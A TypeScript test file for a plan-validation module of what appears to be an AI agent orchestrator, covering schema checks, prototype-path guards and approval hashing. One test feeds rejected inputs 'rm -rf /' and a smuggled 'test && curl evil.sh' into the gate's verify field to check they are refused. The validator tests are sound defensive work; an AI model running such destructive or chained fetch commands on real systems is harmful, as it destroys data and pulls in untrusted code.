import assert from "node:assert/strict";
import { test } from "node:test";
import {
  isApprovalCurrent,
  newPlanId,
  normalizePlanInput,
  parsePredicatePath,
  planHash,
  stepsById,
  type Plan,
} from "./plan.ts";

type Draft = Record<string, any>;

function draft(): Draft {
  return {
    workItemId: "wi-1",
    task: { title: "T", statement: "Do the thing.", cwd: "/repo" },
    provider: { id: "p", version: "1", catalogHash: "h" },
    budget: { agentCalls: 4, concurrency: 2 },
    policy: { blockable: false, maxEscalation: 2, onGateFail: "escalate" },
    steps: [
      {
        id: "s1",
        kind: "serial",
        mode: "AFK",
        procedure: "spec",
        label: "Spec",
        blockedBy: [],
        brief: "Write it.",
        gate: { schema: { type: "object" }, predicates: [] },
        escalation: 1,
        effects: "readonly",
      },
    ],
  };
}

function build(mutate: (plan: Draft) => void = () => {}): Plan {
  const raw = draft();
  mutate(raw);
  return normalizePlanInput(raw);
}

function rejects(mutate: (plan: Draft) => void, pattern: RegExp) {
  assert.throws(() => build(mutate), pattern);
}

test("a well formed plan normalizes", () => {
  const plan = build();
  assert.equal(plan.version, 2);
  assert.match(plan.planId, /^pl_[0-9a-f]{12}$/);
  assert.equal(plan.steps.length, 1);
  assert.equal(plan.steps[0]!.effects, "readonly");
});

test("a supplied planId is kept, a malformed one is refused", () => {
  assert.equal(
    build((plan) => (plan.planId = "pl_beef99")).planId,
    "pl_beef99",
  );
  rejects((plan) => (plan.planId = "plan-1"), /planId must look like pl_<hex>/);
});

test("newPlanId produces the documented shape", () => {
  assert.match(newPlanId(), /^pl_[0-9a-f]{12}$/);
});

test("required fields are named when they are missing", () => {
  rejects((plan) => delete plan.task.statement, /task\.statement is required/);
  rejects((plan) => delete plan.workItemId, /workItemId is required/);
  rejects((plan) => delete plan.steps[0].brief, /step "s1"\.brief is required/);
  rejects((plan) => (plan.steps = []), /steps must not be empty/);
});

test("whitespace is not content", () => {
  rejects((plan) => (plan.steps[0].brief = "   "), /must not be empty/);
});

test("enum fields say what they would have accepted", () => {
  rejects(
    (plan) => (plan.steps[0].kind = "magic"),
    /kind must be one of inline \| serial \| fanout \| script/,
  );
  rejects(
    (plan) => (plan.steps[0].effects = "database"),
    /effects must be one of readonly \| worktree \| repo/,
  );
  rejects(
    (plan) => (plan.policy.onGateFail = "ignore"),
    /onGateFail must be one of repair-once \| escalate/,
  );
});

test("escalation is a level, not any number", () => {
  rejects((plan) => (plan.steps[0].escalation = 4), /must be at most 3/);
  rejects((plan) => (plan.steps[0].escalation = 0), /must be at least 1/);
  rejects((plan) => (plan.steps[0].escalation = 1.5), /must be an integer/);
});

test("a step cannot block itself and cannot list a predecessor twice", () => {
  rejects((plan) => (plan.steps[0].blockedBy = ["s1"]), /cannot block itself/);
  rejects(
    (plan) => (plan.steps[0].blockedBy = ["s0", "s0"]),
    /blockedBy contains duplicates/,
  );
});

test("a fan-out needs items, and only a fan-out may have them", () => {
  rejects(
    (plan) => (plan.steps[0].kind = "fanout"),
    /fanout must be an object/,
  );
  rejects((plan) => {
    plan.steps[0].kind = "fanout";
    plan.steps[0].fanout = { items: [] };
  }, /fanout\.items must not be empty/);
  rejects((plan) => {
    plan.steps[0].kind = "fanout";
    plan.steps[0].fanout = {
      items: [
        { key: "a", brief: "x" },
        { key: "a", brief: "y" },
      ],
    };
  }, /duplicate keys/);
  rejects(
    (plan) => (plan.steps[0].fanout = { items: [{ key: "a", brief: "x" }] }),
    /only valid on a "fanout" step/,
  );
});

test("predicate operators that compare need something to compare against", () => {
  rejects(
    (plan) =>
      (plan.steps[0].gate.predicates = [{ path: "a", op: "minLength" }]),
    /value is required/,
  );
  rejects(
    (plan) =>
      (plan.steps[0].gate.predicates = [
        { path: "a", op: "minLength", value: "three" },
      ]),
    /value must be an integer/,
  );
  rejects(
    (plan) => (plan.steps[0].gate.predicates = [{ path: "a", op: "eq" }]),
    /value is required for op "eq"/,
  );
  rejects(
    (plan) => (plan.steps[0].gate.predicates = [{ path: "a", op: "sortOf" }]),
    /op must be one of exists \| nonEmpty/,
  );
});

test("a matches pattern is compiled at admission, not at gate time", () => {
  // A gate that throws is a gate that fails open at the worst moment.
  rejects(
    (plan) =>
      (plan.steps[0].gate.predicates = [
        { path: "a", op: "matches", value: "([unclosed" },
      ]),
    /not a valid regular expression/,
  );
  const plan = build((draftPlan) => {
    draftPlan.steps[0].gate.predicates = [
      { path: "a", op: "matches", value: "^ok$" },
    ];
  });
  assert.equal(plan.steps[0]!.gate!.predicates[0]!.value, "^ok$");
});

test("a predicate path cannot walk the prototype chain", () => {
  for (const path of ["__proto__", "a.constructor.b", "x.prototype"]) {
    rejects(
      (plan) => (plan.steps[0].gate.predicates = [{ path, op: "exists" }]),
      /must not traverse/,
    );
  }
  rejects(
    (plan) =>
      (plan.steps[0].gate.predicates = [{ path: "a..b", op: "exists" }]),
    /empty segment/,
  );
});

test("parsePredicatePath splits a legal path", () => {
  assert.deepEqual(parsePredicatePath("risks.0.severity", "p"), [
    "risks",
    "0",
    "severity",
  ]);
});

test("a gate verifies with a script name, never a shell command", () => {
  // The plan is a code execution surface. Whoever approves it should only have
  // to trust the repo's own scripts, not audit a command line.
  rejects(
    (plan) => (plan.steps[0].gate.verify = { command: "rm -rf /" }),
    /takes a package\.json script name as `script`, not a shell `command`/,
  );
  rejects(
    (plan) => (plan.steps[0].gate.verify = { script: "test && curl evil.sh" }),
    /must be a package\.json script name/,
  );
  const plan = build((draftPlan) => {
    draftPlan.steps[0].gate.verify = { script: "test:unit" };
  });
  assert.deepEqual(plan.steps[0]!.gate!.verify, { script: "test:unit" });
});

test("a notify channel may be named as a bare string", () => {
  const plan = build((draftPlan) => {
    draftPlan.policy.notify = ["file", { channel: "ui" }];
  });
  assert.deepEqual(plan.policy.notify, [
    { channel: "file" },
    { channel: "ui" },
  ]);
});

test("caps refuse a plan large enough to be a denial of service", () => {
  rejects((plan) => {
    plan.steps = Array.from({ length: 65 }, (_unused, index) => ({
      ...draft().steps[0],
      id: `s${index}`,
    }));
  }, /steps must have at most 64 entries/);
});

test("empty optional objects are dropped rather than stored", () => {
  const plan = build((draftPlan) => {
    draftPlan.steps[0].budget = {};
    draftPlan.steps[0].model = {};
    draftPlan.steps[0].inputs = [];
  });
  assert.equal("budget" in plan.steps[0]!, false);
  assert.equal("model" in plan.steps[0]!, false);
  assert.equal("inputs" in plan.steps[0]!, false);
});

test("planHash ignores key order but not content", () => {
  const a = build((plan) => {
    plan.steps[0].gate.schema = { type: "object", title: "Result" };
  });
  const b = build((plan) => {
    plan.steps[0].gate.schema = { title: "Result", type: "object" };
    plan.planId = a.planId;
  });
  assert.equal(planHash(a), planHash(b));

  const c = build((plan) => {
    plan.steps[0].gate.schema = { type: "object", title: "Other" };
    plan.planId = a.planId;
  });
  assert.notEqual(planHash(a), planHash(c));
});

test("planHash excludes the approval, so approving does not change it", () => {
  const plan = build();
  const before = planHash(plan);
  plan.approval = {
    planHash: before,
    approvedAt: Date.now(),
    approvedBy: "user",
  };
  assert.equal(planHash(plan), before);
  assert.equal(isApprovalCurrent(plan), true);
});

test("any edit after approval invalidates it", () => {
  const plan = build();
  plan.approval = {
    planHash: planHash(plan),
    approvedAt: Date.now(),
    approvedBy: "user",
  };
  plan.steps[0]!.brief = "Write something else entirely.";
  assert.equal(isApprovalCurrent(plan), false);
});

test("a plan with no approval is never current", () => {
  assert.equal(isApprovalCurrent(build()), false);
});

test("an approval is parsed back off disk", () => {
  const plan = build((draftPlan) => {
    draftPlan.approval = {
      planHash: "abc",
      approvedAt: 1,
      approvedBy: "user",
    };
  });
  assert.equal(plan.approval?.planHash, "abc");
  rejects(
    (draftPlan) =>
      (draftPlan.approval = {
        planHash: "abc",
        approvedAt: 1,
        approvedBy: "the model",
      }),
    /approvedBy must be one of user/,
  );
});

test("stepsById indexes the plan", () => {
  const index = stepsById(build());
  assert.equal(index.get("s1")?.label, "Spec");
});
